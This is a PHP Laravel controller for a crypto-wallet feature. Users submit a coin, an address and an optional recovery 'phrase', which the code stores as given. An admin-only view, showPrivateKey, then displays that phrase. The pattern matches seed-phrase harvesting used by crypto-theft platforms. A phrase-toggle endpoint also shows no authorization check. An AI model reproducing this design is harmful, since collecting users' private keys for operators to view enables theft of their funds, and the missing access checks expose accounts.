<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\UserWallets;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;

class UserWalletsController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
        $wallets = UserWallets::where('user_id', Auth::user()->id)->get();
        return view('user.wallets.manage', compact('wallets'));
    }

    public function showAdmin($id) {
        $id = decrypt($id);
        $wallets = UserWallets::where('user_id', $id)->get();
        $user = User::find($id);
        return view('admin.user-wallets.index', compact('wallets', 'user'));
    }

    public function showPrivateKey($id) {
        $id = decrypt($id);
        $private_key = UserWallets::where('id', $id)->first()->phrase;
        return view('admin.user-wallets.phrase', compact('private_key'));
    }

    //activate phrase
    public function activatePhrase(Request $request){
        $user = $request->all();
        $user = User::find($user['user_id']);
        $phrase = $user->phrase == 'no' ? 'yes' : 'no';
        $change = DB::table('users')
                        ->where('id', $user->id)
                        ->update([
                            'phrase' => $phrase
                        ]);
            if($change){
                return response()->json([
                    'message' => 'Done!',
                ], 200);
            } else {
                return response()->json([
                    'message' => 'Failed!',
                ], 401);
            }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
        return view('user.wallets.index');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
        $request->validate([
            'coin' => 'string|required',
            'address' => 'string|required',
            'network' => 'string|nullable',
            'phrase' => 'string|nullable',
        ]);

        $wallet = new UserWallets();
        $wallet->user_id = Auth::user()->id;
        $wallet->coin = $request->coin;
        $wallet->address = $request->address;
        $wallet->network = $request->network;
        $wallet->phrase = $request->phrase;

        $wallet->save();

        return Redirect()->route('user.new.withdrawal')->with('success', 'New wallet connected!');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\UserWallets  $userWallets
     * @return \Illuminate\Http\Response
     */
    public function show(UserWallets $userWallets)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\UserWallets  $userWallets
     * @return \Illuminate\Http\Response
     */
    public function edit(UserWallets $userWallets)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\UserWallets  $userWallets
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, UserWallets $userWallets)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\UserWallets  $userWallets
     * @return \Illuminate\Http\Response
     */
    public function destroy(UserWallets $userWallets, $id)
    {
        //
        $id = decrypt($id);
        $userWallets::where('id', $id)->delete();
        return back()->with('success', 'Wallet Deleted!');

    }
}
